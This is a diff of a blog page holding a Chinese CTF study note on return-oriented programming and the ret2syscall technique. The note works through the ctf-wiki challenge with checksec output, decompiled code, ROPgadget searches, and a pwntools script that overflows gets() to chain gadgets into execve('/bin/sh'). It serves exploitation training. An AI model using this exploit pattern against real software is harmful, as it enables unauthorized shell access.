@@ -147,39 +147,48 @@ golden的部落阁 = title写得真好</title>
   <div class="body md" itemprop="articleBody">
     
 
-    <h1 id="pwn学习笔记3"><a class="markdownIt-Anchor" href="#pwn学习笔记3">#</a> pwn 学习笔记（3）</h1>
-<h2 id="rop原理"><a class="markdownIt-Anchor" href="#rop原理">#</a> ROP 原理：</h2>
-<p>​	ROP (Return Oriented Programming) 返回导向编程，主要思想是通过在程序中已有的小片段（gadgets）来改变某些寄存器或者变量的值，从而控制程序的执行流程。</p>
-<h2 id="栈溢出ret2syscall"><a class="markdownIt-Anchor" href="#栈溢出ret2syscall">#</a> 栈溢出–ret2syscall：</h2>
-<h3 id="1系统调用"><a class="markdownIt-Anchor" href="#1系统调用">#</a> 1. 系统调用：</h3>
-<p>​	对于一个已经存在于标准库中的函数，例如 printf ()，我们编写某个程序的时候，这个函数仅仅只用了 printf (参数); 这么一行，但是，其工作可是很复杂的，printf () 调用了函数库当中的其他更加底层的函数，然后被调用的函数肯定会调用再底层的函数，知道调用到系统调用中的 write () 函数为止；由上可知，任何一个函数想要完成某样工作，都必须要经过系统调用来操作硬件才能够成功。</p>
-<p>​	在 Linux 中，系统调用通常通过 int 80h 这一汇编代码实现，int 表示的是终端，interrupt，80h 则是代指的系统调用的终端符号，当程序执行到 int 80h 这一代码的时候，就会将相应的通用寄存器 eax 中的参数作为系统调用的调用号，其他寄存器中的值或者地址所指向的值作为参数，例如：</p>
+    <h1 id="pwn学习笔记（3）"><a href="#pwn学习笔记（3）" class="headerlink" title="pwn学习笔记（3）"></a>pwn学习笔记（3）</h1><h2 id="ROP原理："><a href="#ROP原理：" class="headerlink" title="ROP原理："></a>ROP原理：</h2><p>​	ROP(Return Oriented Programming)返回导向编程，主要思想是通过在程序中已有的小片段（gadgets）来改变某些寄存器或者变量的值，从而控制程序的执行流程。</p>
+<h2 id="栈溢出–ret2syscall："><a href="#栈溢出–ret2syscall：" class="headerlink" title="栈溢出–ret2syscall："></a>栈溢出–ret2syscall：</h2><h3 id="1-系统调用："><a href="#1-系统调用：" class="headerlink" title="1.系统调用："></a>1.系统调用：</h3><p>​	对于一个已经存在于标准库中的函数，例如printf()，我们编写某个程序的时候，这个函数仅仅只用了printf(参数);这么一行，但是，其工作可是很复杂的，printf()调用了函数库当中的其他更加底层的函数，然后被调用的函数肯定会调用再底层的函数，知道调用到系统调用中的write()函数为止；由上可知，任何一个函数想要完成某样工作，都必须要经过系统调用来操作硬件才能够成功。</p>
+<p>​	在Linux中，系统调用通常通过int 80h 这一汇编代码实现，int表示的是终端，interrupt，80h则是代指的系统调用的终端符号，当程序执行到int 80h这一代码的时候，就会将相应的通用寄存器eax中的参数作为系统调用的调用号，其他寄存器中的值或者地址所指向的值作为参数，例如：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)   <span class="comment">//（32位程序）</span></span><br></pre></td></tr></table></figure>
-<p>​	该函数的系统调用号为 11，这里可以通过.</p>
+
+<p>​	该函数的系统调用号为11，这里可以通过.</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/include/asm/unistd_32.h | grep execve </span><br></pre></td></tr></table></figure>
-<p>进行查询，那么，如果想要调用 execve () 函数，就需要提前让相应的通用寄存器置于正确的值，这样才能进行正确的系统调用，所以需要让：</p>
+
+<p>进行查询，那么，如果想要调用execve()函数，就需要提前让相应的通用寄存器置于正确的值，这样才能进行正确的系统调用，所以需要让：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">eax=0xb</span><br><span class="line"></span><br><span class="line">ebx=/bin/sh 的地址</span><br><span class="line"></span><br><span class="line">ecx=0</span><br><span class="line"></span><br><span class="line">edx=0</span><br></pre></td></tr></table></figure>
-<h3 id="2题目示例ctf-wikipwn-ret2syscall"><a class="markdownIt-Anchor" href="#2题目示例ctf-wikipwn-ret2syscall">#</a> 2. 题目示例（ctf-Wiki—pwn-ret2syscall）：</h3>
-<p>​	首先应该检测程序的保护：</p>
+
+
+
+<h3 id="2-题目示例（ctf-Wiki—pwn-ret2syscall）："><a href="#2-题目示例（ctf-Wiki—pwn-ret2syscall）：" class="headerlink" title="2.题目示例（ctf-Wiki—pwn-ret2syscall）："></a>2.题目示例（ctf-Wiki—pwn-ret2syscall）：</h3><p>​	首先应该检测程序的保护：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2syscall checksec rop</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-<p>​	可以看出，程序是一个 32 位小端序之开启了 NX 保护的程序，之后用 IDA 静态调试一下：</p>
+
+<p>​	可以看出，程序是一个32位小端序之开启了NX保护的程序，之后用IDA静态调试一下：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [sp+1Ch] [bp-64h]@1</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you plan to do?&quot;</span>);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>​	这里仍是一个栈溢出的题目，危险函数很明显，可以直接利用到，之后，类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。</p>
 <p>​	因此，接下来，需要达成的系统调用，就是</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>
+
 <p>​	之后，就需要按照如下的方式来置位正确的寄存器的值</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">系统调用号，即 eax 应该为 0xb</span><br><span class="line">第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，即 ecx 应该为 0</span><br><span class="line">第三个参数，即 edx 应该为 0</span><br></pre></td></tr></table></figure>
-<p>​	那么，能够直接操作寄存器的则是汇编代码，因此，则需要使用 ROPgadget 工具来寻找相关的代码：</p>
+
+<p>​	那么，能够直接操作寄存器的则是汇编代码，因此，则需要使用ROPgadget工具来寻找相关的代码：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2syscall ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>
+
 <p>​	以及：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2syscall ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
+
 <p>​	这里找到了这个：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>
-<p>​	然后就是 /bin/sh 的地址了：</p>
+
+<p>​	然后就是&#x2F;bin&#x2F;sh的地址了：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2syscall ROPgadget --binary rop  --string &#x27;/bin/sh&#x27; </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>
-<p>​	最后则是 int 80h 的地址：</p>
+
+<p>​	最后则是int 80h的地址：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  ret2syscall ROPgadget --binary rop  --only &#x27;int&#x27;                 </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080938fe : int 0xbb</span><br><span class="line">0x080869b5 : int 0xf6</span><br><span class="line">0x0807b4d4 : int 0xfc</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure>
-<p>​	像这样，按照寄存器以及值的关系，依次将寄存器置位正确的值，之后执行 int 80h，即可达到正确的系统调用，相应的脚本如下：</p>
+
+<p>​	像这样，按照寄存器以及值的关系，依次将寄存器置位正确的值，之后执行int 80h，即可达到正确的系统调用，相应的脚本如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&#x27;./rop&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_eax_ret = 0x080bb196</span><br><span class="line">pop_edx_ecx_ebx_ret = 0x0806eb90</span><br><span class="line">int_0x80 = 0x08049421</span><br><span class="line">binsh = 0x80be408</span><br><span class="line">payload = flat(</span><br><span class="line">    [&#x27;A&#x27; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
       <div class="tags">
@@ -282,7 +291,7 @@ golden的部落阁 = title写得真好</title>
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="文章目录">
-          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03"><span class="toc-number">1.</span> <span class="toc-text"> pwn 学习笔记（3）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#rop%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text"> ROP 原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BAret2syscall"><span class="toc-number">1.2.</span> <span class="toc-text"> 栈溢出–ret2syscall：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1. 系统调用：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E9%A2%98%E7%9B%AE%E7%A4%BA%E4%BE%8Bctf-wikipwn-ret2syscall"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 2. 题目示例（ctf-Wiki—pwn-ret2syscall）：</span></a></li></ol></li></ol></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%883%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">pwn学习笔记（3）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">ROP原理：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E2%80%93ret2syscall%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">栈溢出–ret2syscall：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%EF%BC%9A"><span class="toc-number">1.2.1.</span> <span class="toc-text">1.系统调用：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E9%A2%98%E7%9B%AE%E7%A4%BA%E4%BE%8B%EF%BC%88ctf-Wiki%E2%80%94pwn-ret2syscall%EF%BC%89%EF%BC%9A"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.题目示例（ctf-Wiki—pwn-ret2syscall）：</span></a></li></ol></li></ol></li></ol>
       </div>
       <div class="related panel pjax" data-title="系列文章">
         <ul>
@@ -391,22 +400,30 @@ golden的部落阁 = title写得真好</title>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/Major/" title="分类于 考研专业课">考研专业课</a>
-<i class="ic i-angle-right"></i>
-<a href="/categories/Major/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="分类于 数据结构">数据结构</a>
+<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
 </div>
 
-    <span><a href="/2024/06/15/Major/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-3%E3%80%81%E6%A0%88%E3%80%81%E9%98%9F%E5%88%97%E5%92%8C%E6%95%B0%E7%BB%84/" title="数据结构-3、栈、队列和数组">数据结构-3、栈、队列和数组</a></span>
+    <span><a href="/2024/05/17/Game/%E3%80%902024%E3%80%91H-NCTF/" title="【2024】H&amp;NCTF">【2024】H&NCTF</a></span>
   </li>
 
       
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+<a href="/categories/Java/" title="分类于 Java从入门到入狱">Java从入门到入狱</a>
 </div>
 
-    <span><a href="/2024/02/04/Pwn/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%882%EF%BC%89-ret-2-text-or-shellcode/" title="Pwn学习笔记（2）--ret_2_text_or_shellcode">Pwn学习笔记（2）--ret_2_text_or_shellcode</a></span>
+    <span><a href="/2024/05/27/Java/%E4%B8%89%E3%80%81Servlet%E5%9F%BA%E7%A1%80/" title="三、Servlet基础">三、Servlet基础</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Java/" title="分类于 Java从入门到入狱">Java从入门到入狱</a>
+</div>
+
+    <span><a href="/2024/05/26/Java/%E4%B8%80%E3%80%81Servlet%E5%92%8CJSP%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/" title="一、Servlet和JSP技术概述">一、Servlet和JSP技术概述</a></span>
   </li>
 
       
@@ -436,37 +453,7 @@ golden的部落阁 = title写得真好</title>
 <a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
 </div>
 
-    <span><a href="/2024/02/04/Pwn/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/" title="Pwn学习笔记（1）--前置知识">Pwn学习笔记（1）--前置知识</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/Java/" title="分类于 Java从入门到入狱">Java从入门到入狱</a>
-</div>
-
-    <span><a href="/2024/05/26/Java/%E4%B8%80%E3%80%81Servlet%E5%92%8CJSP%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/" title="一、Servlet和JSP技术概述">一、Servlet和JSP技术概述</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
-</div>
-
-    <span><a href="/2024/05/21/Daily/%E5%B0%8F%E5%B0%8F%E7%9A%84%E6%80%BB%E7%BB%93%EF%BC%88%E6%97%A5%E5%B8%B8%E5%8F%91%E7%99%AB%EF%BC%89/" title="小小的总结（日常发癫）">小小的总结（日常发癫）</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
-</div>
-
-    <span><a href="/2024/05/06/Game/%E3%80%902024%E3%80%91%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B/" title="【2024】高校网络安全管理运维赛">【2024】高校网络安全管理运维赛</a></span>
+    <span><a href="/2024/02/04/Pwn/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%882%EF%BC%89-ret-2-text-or-shellcode/" title="Pwn学习笔记（2）--ret_2_text_or_shellcode">Pwn学习笔记（2）--ret_2_text_or_shellcode</a></span>
   </li>
 
       
@@ -483,10 +470,32 @@ golden的部落阁 = title写得真好</title>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+<a href="/categories/Major/" title="分类于 考研专业课">考研专业课</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/Major/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" title="分类于 数据结构">数据结构</a>
 </div>
 
-    <span><a href="/2024/03/23/Pwn/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%886%EF%BC%89-%E5%A0%86%E5%9F%BA%E7%A1%80%E6%A6%82%E8%BF%B0/" title="pwn学习笔记（6）--堆基础概述">pwn学习笔记（6）--堆基础概述</a></span>
+    <span><a href="/2024/06/12/Major/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%94%E8%AE%B0-2%E3%80%81%E7%BA%BF%E6%80%A7%E8%A1%A8/" title="数据结构笔记-2、线性表">数据结构笔记-2、线性表</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
+</div>
+
+    <span><a href="/2024/06/11/Daily/%E9%9A%8F%E6%9C%BA%E4%BA%8C%E6%AC%A1%E5%85%83%E5%9B%BEapi%E7%9B%B8%E5%85%B3/" title="随机二次元图api相关">随机二次元图api相关</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/2024/03/03/Web/SQL%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/" title="SQL无列名注入">SQL无列名注入</a></span>
   </li>
 
   </ul>
